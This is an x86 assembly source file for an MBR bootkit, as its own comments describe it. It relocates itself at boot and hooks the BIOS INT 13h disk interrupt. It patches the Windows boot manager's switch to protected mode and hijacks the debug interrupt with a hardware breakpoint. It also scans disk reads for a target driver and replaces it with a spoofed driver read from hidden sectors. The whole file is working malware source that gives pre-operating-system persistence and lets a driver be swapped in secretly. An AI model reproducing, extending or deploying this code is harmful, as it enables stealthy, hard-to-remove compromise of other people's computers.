	bits 16
	section .text
	global MbrBegin
	extern Idt32Begin
	extern OriginalInt1
	extern TargetDriverPattern
	extern TargetDriverPatternSize

MBR_ADDR: equ 0x7c00
COPY_ADDR: equ 0x1000
COPY_SEG: equ (COPY_ADDR >> 4)
SECTOR_SIZE: equ 0x200
SECTOR_SHIFT: equ 9
IDT_COPY_OFFSET: equ 0x100
BMGR_CODE_SEL: equ 0x20
TOTAL_CODE_SIZE: equ (2 * SECTOR_SIZE)
ORIG_MBR_MAGIC: equ 0xAAAA
DRV_SIZE_MAGIC: equ 0xBBBB
DRV_SECT_MAGIC: equ 0xCCCC

MbrBegin:
	pusha
	mov bx, ORIG_MBR_MAGIC		; sector # of original mbr
	push bx
	xor ax, ax
	mov es, ax
	mov ss, ax
	mov ds, ax
								; copy remainder of bootkit
	mov cx, bx					; starting sector
	add cx, 1
								; dst (es:bx)
	mov bx, MBR_ADDR + SECTOR_SIZE
	mov ax, 0x0202				; ah: read sectors code
								; al: sectors to read (max 0x80)
	mov dh, 0					; head (BIOS sets dl to drive #)
	int 0x13

	mov di, COPY_ADDR			; copy bootkit code
	mov si, MBR_ADDR
	mov cx, TOTAL_CODE_SIZE
	rep movsb
	
								; save drive index
	mov [COPY_ADDR + DriveIndex], dl

	pop bx
								; execute from new location
	jmp COPY_SEG:HookInt13 - MbrBegin

HookInt13:
	cli
	mov ax, [13h * 4]			; hook disk ivt entry
	mov [cs:OriginalInt13], ax
	mov ax, [13h * 4 + 2]
	mov [cs:OriginalInt13 + 2], ax
	mov word[13h * 4], HookedDisk
	mov word[13h * 4 + 2], COPY_SEG
	sti

								; restore_mbr
	mov cx, bx					; starting sector
	mov bx, MBR_ADDR			; dst (es:bx)
	
	mov ax, 0x0201				; ah: read sectors code
								; al: sectors to read (max 0x80)
	mov dh, 0					; head (BIOS sets dl to drive #)
	int 0x13

	popa
	jmp 0:MBR_ADDR				; execute original mbr

HookedDisk:
	cmp ah, 42h
	jz ExtendedRead
	
	jmp far [cs:OriginalInt13]	; will not return
ExtendedRead:
	pushf						; emulate int instruction
	call far [cs:OriginalInt13]
	pusha
	pushf
	push ds
	push es

	jc EndBytes					; skip if there was an error
	cld							; clear for memcmp
	xor eax, eax
	mov ax, [si + 2]			; SectorCount
	shl eax, SECTOR_SHIFT		; ByteCount = SectorCount * SECTOR_SIZE
	mov di, [si + 4]			; buffer offset
	mov es, [si + 6]			; buffer segment
	push COPY_SEG
	pop ds						; set ds for our globals
	xor ebx, ebx				; clear upper bits
	
LoopBytes:						; for (eax = ByteCount; eax != 0; di++, eax--)
	test eax, eax
	jz EndBytes
	mov bx, di					; save current scan offset

	mov si, PmEnterPattern
	mov cx, PmEnterPatternEnd - PmEnterPattern
	call ScanBytes
	jz HookBootmgr16End
	mov si, PmEnterHook
	mov di, bx
	movsd						; hook bootmgr16
	movsb
HookBootmgr16End:

	mov si, InvokeBootmgr32Pattern
	mov cx, InvokeBootmgr32PatternEnd - InvokeBootmgr32Pattern
	call ScanBytes
	jz FindBootmgr32End
	xor ecx, ecx
	mov ecx, es
	shl ecx, 4
	add ecx, ebx
								; save address for bp later
	mov [cs:JmpToBootmgr32], ecx
FindBootmgr32End:

	mov si, TargetDriverPattern
	mov cx, TargetDriverPatternSize
	call ScanBytes
	jz FindTargetDriverEnd

								; memset
	mov cx, -1					; cover the spoofed driver
	mov al, 0					; value
	xor di, di					; offset zero incase the driver is loaded in peices
	rep stosb
								; spoof driver
	mov ax, DRV_SIZE_MAGIC		; sectors to read
	mov ah, 2					; read sectors
	mov cx, DRV_SECT_MAGIC		; target sector
	mov dh, 0
	mov dl, [DriveIndex]
								; dst segment is already set
	xor bx, bx					; dst offset
	int 0x13
	jmp EndBytes
FindTargetDriverEnd:

	mov di, bx					; restore current scan offset
	inc di
	dec eax
	jmp LoopBytes
EndBytes:
	pop es
	pop ds
	popf
	popa
	retf 2						; the interrupt uses retf 2 instead of iret
								; so it can pass info back in the flags
ScanBytes:
	mov di, bx					; reset for new scan
	repe cmpsb					; memcmp(sector[di], seq, seq_len)
	jnz NoMatch
	cmpsb
	jz NoMatch					; ensure the last byte does not match
	mov cx, 1					; success
	jmp ScanEnd
NoMatch:
	xor cx, cx
ScanEnd:
	test cx, cx
	ret

PivotToIdt:
	pusha
	push ds
	push es

	push COPY_SEG				; unhook bootmgr
	pop ds
	mov si, PmEnterPattern
	mov bp, sp
	push word[bp + 16h]			; old CS
	pop es
	mov di, [bp + 14h]			; old IP
	sub di, PmEnterHookEnd - PmEnterHook
	mov [bp + 14h], di			; fix up return address
	movsd						; ds:si to es:di
	movsb

	lea eax, [bp - 6]
	sidt [eax]
	mov eax, [eax + 2]			; get IDT base

	mov bx, ax
	and bx, 0xF					; use segment to access high addresses
	mov ecx, eax
	add eax, IDT_COPY_OFFSET
	mov [Idt32Begin + 2], eax
	shr ecx, 4
	mov ds, cx
	mov ecx, eax
	shr ecx, 4
	mov es, cx
	
	mov cx, [bx + 8]			; hook int1
	mov dx, [bx + 14]
	mov [bx + 8], ax			; hook offset bits 0-15
	mov word[bx + 10], BMGR_CODE_SEL
	shr eax, 16
	mov [bx + 14], ax			; hook offset bits 16-31

	push COPY_SEG				; save original int1
	pop ds
	mov [OriginalInt1], cx
	mov [OriginalInt1 + 2], dx

	mov di, bx					; copy 32 & 64 bit code to second half of idt
	mov si, Idt32Begin
	mov cx, TOTAL_CODE_SIZE - SECTOR_SIZE
	rep movsb

	mov eax, [JmpToBootmgr32]	; set hardware breakpoint on switch to PM
	mov dr0, eax
	mov eax, 2					; enable dr0 - execute
	mov dr7, eax

	pop es
	pop ds
	popa
	retf						; return to bootmgr16

PmEnterHook:
	call COPY_SEG:PivotToIdt	; far call
PmEnterHookEnd:

; append a byte that does not match to ignore matching with itself
PmEnterPattern:
	mov cr0, eax				; enables protected mode
	xchg bx, bx
PmEnterPatternEnd:	db 0xFF
InvokeBootmgr32Pattern:
	push dword BMGR_CODE_SEL
	push ebx
	retfd
InvokeBootmgr32PatternEnd:	db 0xFF

times 440-($-$$) db 0			; everything after byte 440 will be overwritten

; data here must be uninitializable
JmpToBootmgr32:	dd 0
OriginalInt13:	dd 0
DriveIndex: db 0

times SECTOR_SIZE-($-$$) db 0	; pad to boot sector size